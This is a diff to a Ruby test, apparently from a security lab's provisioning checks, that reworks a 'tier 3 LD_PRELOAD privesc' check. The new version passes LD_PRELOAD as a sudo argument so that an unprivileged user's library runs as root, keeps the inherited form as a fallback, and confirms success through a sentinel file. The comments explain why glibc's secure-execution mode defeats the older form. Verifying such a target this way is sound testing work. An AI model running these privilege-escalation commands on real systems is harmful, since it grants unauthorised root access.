@@ -75,9 +75,22 @@ class SudoEnvKeepLdPreloadTest < PostProvisionTest
             skip_check('tier 3 LD_PRELOAD privesc',
                        'no C compiler on the target or the attacker to build the preload library', tier: 3)
           else
-            # sudo keeps the inline LD_PRELOAD and re-exports it to the root command.
-            expl = run_as_user(user, "LD_PRELOAD=#{lib_path} sudo -n /usr/local/bin/system_status")
-            body = read_sentinel(sentinel)
+            # On modern glibc the dynamic linker runs sudo (set-user-ID) in
+            # secure-execution mode and strips LD_PRELOAD from its environment,
+            # so exporting it *before* sudo is scrubbed before sudo can re-export
+            # it (ld.so(8), "Secure-execution mode"). The working form passes
+            # LD_PRELOAD as a sudo command-line variable: sudo reads it from argv
+            # and re-exports it to the root command because env_keep permits it.
+            # The inherited form is kept as a fallback for older libc behaviour.
+            attempts = ["sudo -n LD_PRELOAD=#{lib_path} /usr/local/bin/system_status",
+                        "LD_PRELOAD=#{lib_path} sudo -n /usr/local/bin/system_status"]
+            expl = nil
+            body = ''
+            attempts.each do |cmd|
+              expl = run_as_user(user, cmd)
+              body = read_sentinel(sentinel)
+              break if !body.empty? && sentinel_pwned?(body)
+            end
             if body.empty? || !sentinel_pwned?(body)
               fail_check('tier 3 LD_PRELOAD privesc',
                          "exploit left no sentinel (sudo output: #{(expl[:stdout].to_s + expl[:stderr].to_s).strip[0, 200]})",
